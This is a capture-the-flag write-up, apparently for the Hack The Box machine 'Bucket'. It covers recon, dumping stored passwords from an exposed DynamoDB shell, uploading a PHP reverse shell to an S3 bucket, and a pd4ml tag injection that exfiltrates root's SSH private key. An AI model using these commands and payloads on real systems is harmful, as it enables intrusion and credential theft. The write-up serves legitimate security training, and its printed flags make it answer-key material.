# Bucket

export IP=10.10.10.212

# Solution

Start with a nmap scan

```
cmd: nmap -sC -sV -oN nmap/initial $IP

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/

```
We can already see a domain (<b> bucket.htb </b>), lets add to /etc/hosts <br>

Lets do an all port on the side... UPDATE: was taking toooo long, cancelled<br>

Visiting the website, we can already see two things
```
support@bucket.htb
http://s3.bucket.htb/adserver/images/bug.jpg
```

maybe <b> s3 </b> is a subdomain, lets add it to the /etc/hosts ! <br>

There is not much else to see... <br>

Lets fuzz 
```
cmd: gobuster dir -u http://bucket.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -o gobuster/big.log -x php,html,txt -t 70

/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
```

Another gobuster (on the s3.bucket.htb)
```
/health (Status: 200)
/server-status (Status: 403)
/shell (Status: 200)
```

We now have a shell to interact with the dynamoDb in the AWS server (S3) <br>

After researching docs i listed all the tables (in the current db)
```

REQUEST
-----------------------------------------------------
dynamodb.listTables().eachPage(function(err, data) {
    if (err) {
        ppJson(err); // an error occurred
    } else if (data) {
        ppJson(data);
    }
});

######################################################

RESPONSE
-----------------------------------------------------
TableNames : Users
```

Now we need to check its structure
```
REQUEST
-----------------------------------------------------
var params = {
    TableName: "users",
};
dynamodb.describeTable(params, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else ppJson(data); // successful response
});

######################################################
RESPONSE
-----------------------------------------------------

AttributeDefinitions : [
    "0" : {
        "AttributeName" : "username",
        "AttributeType" : S (string?!?!)
    },
    "1" : {
        "AttributeName" : "password",
        "AttributeType" : S (string?!?!)
    }

]
```

Types 
```
S - the attribute is of type String
N - the attribute is of type Number
B - the attribute is of type Binary
```

Now lets dump all the table !! 
```
REQUEST
-----------------------------------------------------
var params = {
    TableName: 'users',
    Select: "ALL_ATTRIBUTES"
};
docClient.scan(params, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else ppJson(data); // successful response
});

######################################################
RESPONSE
-----------------------------------------------------
Items : [
    "0" : {
        "password" : "Management@#1@#",
        "username" : "Mgmt"
    },
    "1" : {
        "password" : "Welcome123!",
        "username" : "Cloudadm"
    },
    "2" : {
        "password" : "n2vM-<_K_Q:.Aa2",
        "username" : "Sysadm"
    }
]

```


With the shell provided in the page we can only access the dynamoDB, i tried poking around and tried to find more things but no success <br>

The next thing is: try to do something in the bucket itself and not only in the DB!<br>

For that we need the aws command line interface (aws-cli) and the keys for it... since i could not find any explicit information about the keys, i'll experiment with the creds i found

```
AWS Access Key ID [None]: (USER)
AWS Secret Access Key [None]: (password)
Default region name [None]: us-east-1 <- (this was on the dynamoDB)
Default output format [None]: json
```


The idea will be to upload something were we can access from the webserver (port 80)  ... <br>

Now we need to use the aws-cli to access the server!
```
aws --endpoint-url http://s3.bucket.htb s3 <cmd>
```

In the docs there is some interesting commands !! <b>https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html </b> <br>

Lets list what the instance has
```
REQUEST: aws --endpoint-url http://s3.bucket.htb s3 ls

RESPONSE: 2020-11-24 21:42:01 adserver
```

Lets list what's inside the folder
```
Req: aws --endpoint-url http://s3.bucket.htb/adserver/ s3 ls

Res: 'Buckets'
```

Now lets upload something and try to access it in the webpage !! <br>

I'll try to upload a file with <b> phpinfo() </b> only ... 
```
cmd: aws s3 cp ./waza_test.php s3://adserver    --endpoint-url http://s3.bucket.htb/
```

Now, after upload succeeds, access http://bucket.htb/waza_test.php... and voila it works! <br>
Just upload a revshell... need execute the upload cmd multiple times to have luck (the server is cleaning fast)<br> 
```
whoami 
www-data

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

i used linpeas to enumerate the machine, but nothing was found... so i remembered that the found creds were never used ! <br>

```
CREDS: roy:n2vM-<_K_Q:.Aa2

whoami && id
roy
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)

cat ~/user.txt
FLAG:f051d08172e6a1f9b199675d5768bf03
```

we can already see that roy belongs to the sysadm group !! <br>

running linpeas some things seemd interesting
```
root        1306  0.0  0.1 697504  7572 ?        Sl   21:40   0:03  /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 4566 -container-ip 172.18.0.2 -container-port 4566

ports open 8000 4566

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500  inet 172.17.0.1

Possible private SSH keys were found! /etc/ImageMagick-6/mime.xml

-rwsr-sr-x 1 daemon daemon           55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root   root             31K Aug 16  2019 /usr/bin/pkexec

/var/www/bucket-app/vendor/psr/http-client/src/

-rw-r--r-- 1 root root 159 Sep 16 10:35 /var/lib/sgml-base/supercatalog.old
```

From the /var/www/bucket-app/index.php
```
if($_SERVER["REQUEST_METHOD"]==="POST") {
	if($_POST["action"]==="get_alerts") {
		date_default_timezone_set('America/New_York');
		$client = new DynamoDbClient([
			'profile' => 'default',
			'region'  => 'us-east-1',
			'version' => 'latest',
			'endpoint' => 'http://localhost:4566'
		]);

		$iterator = $client->getIterator('Scan', array(
			'TableName' => 'alerts',
			'FilterExpression' => "title = :title",
			'ExpressionAttributeValues' => array(":title"=>array("S"
=>"Ransomware")),
		));

		foreach ($iterator as $item) {
			$name=rand(1,10000).'.html';
			file_put_contents('files/'.$name,$item["data"]);
		}
		passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.
jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf")
;
	}
}else{
    normal html
}
```

step by step, this is what the php code will do
```
1 - Check if method is POST 
2 - Check if action is get_alerts
3 - Create new object to access dynamo db in the port 4566
4 - Get all the db content in the iterator
5 - For each entry it will create a file
6 - execute the command and (normally) print the contents (passthru is equivallent to the exec() function, the only difference is that it returns the value from the system through a stream)
```


if we check the dynamodb tables through the terminal, we can see that we dont have the table that the command needs (same DB as used for website) <br>

```
aws dynamodb list-tables --endpoint-url http://localhost:4566/ 
{
    "TableNames": [
        "users"
    ]
}
----------------------------------------------------------------
aws dynamodb scan --table-name alerts --endpoint-url http://localhost:4566/ 

#### same as shown before (login creds)
```

So we need to manually create a table named <b>alerts</b> and have two fields:
- title: with the string <b>Ransomware</b> 
- data: with the file we want to export to pdf


Lets create the table first and insert records to try to collect the file /root/.ssh/id_rsa to then ssh as root (since the config permits root login) <br>

I'll make a bash script to include all of these in order to be faster
```
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
        AttributeName=data,AttributeType=S \
    --key-schema \
        AttributeName=title,KeyType=HASH \
        AttributeName=data,KeyType=RANGE \
    --provisioned-throughput \
        ReadCapacityUnits=10,WriteCapacityUnits=5 \
    --endpoint-url \
        http://127.0.0.1:4566

aws dynamodb put-item \
    --table-name alerts  \
    --item \
        '{"title": {"S": "Ransomware"}, "data": {"S": "/root/.ssh/id_rsa"}}'
    --endpoint-url http://127.0.0.1:4566

aws dynamodb scan --table-name alerts --endpoint-url http://localhost:4566/ 

curl -X POST -d "action=get_alerts" "http://127.0.0.1:8000/"

rm /tmp/result.pdf
cp /var/www/bucket-app/files/result.pdf /tmp/w/result.pdf
```

The file is generated but with the string passed in it (/root/.ssh/id_rsa is printed in the .pdf)<br> 

we need to load the content from the path not the path itself <br>

After alot of search, i found something worth trying in the docs (src: https://pd4ml.com/html.htm)
```

TAG: 
<pd4ml:attachment> 

ATTRIBUTES: 
description="text description" 
src="URL of attachment" 
icon="Graph - PushPin - Paperclip - Tag"

DESCRIPTION
embeds external resource as PDF attachment.
```

so we need to craft a tag that when evaluated loads the content of the file into the pdf (care with the ")
```
TAG: <pd4ml:attachment description="None" src="file:///root/.ssh/id_rsa" icon="Paperclip">


'{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"None\" icon=\"Paperclip\" src=\"file:///root/.ssh/id_rsa\"></pd4ml:attachment>"}}'
```

Now we have a private ssh key ! yea !... <br>
```
chmod 600 id_rsa

ssh -i id_rsa root@bucket.htb

whoami && id
root
uid=0(root) gid=0(root) groups=0(root)

cat root.txt
FLAG: 5a3018cab0075bd588f7666efa36c7b5
```